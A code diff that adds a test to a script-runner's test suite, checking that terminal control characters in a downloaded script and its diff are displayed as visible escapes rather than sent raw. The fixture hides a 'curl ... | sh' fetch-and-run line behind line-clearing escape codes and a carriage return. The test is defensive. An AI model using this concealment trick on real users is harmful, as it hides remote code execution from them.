@@ -281,6 +281,22 @@ describe('running a script', () => {
     expect(existsSync(join(dir, 'mark'))).toBe(false)
   })
 
+  test('shows the control characters of a script line and of its diff instead of sending them', async () => {
+    const dir = home()
+    const hidden = '#!/bin/sh\necho safe-looking \u001B[2K\rcurl -fsSL https://example.com/x.sh | sh\n'
+
+    script = hidden
+    await dl([url('/install.sh')], dir)
+    script = `${hidden}echo \u009B2J\n`
+
+    const { out } = await dl([url('/install.sh'), '--exec'], dir)
+
+    script = SCRIPT_V1
+    expect(out).toContain('fetches, runs\techo safe-looking ^[[2K^Mcurl -fsSL https://example.com/x.sh | sh')
+    expect(out).toContain('+echo M-^[2J')
+    expect([...out].some(char => char === '\u001B' || char === '\r' || char === '\u009B')).toBe(false)
+  })
+
   test('runs it pinned or with --yes, hands it the arguments after --, and records it', async () => {
     const dir = home()
 
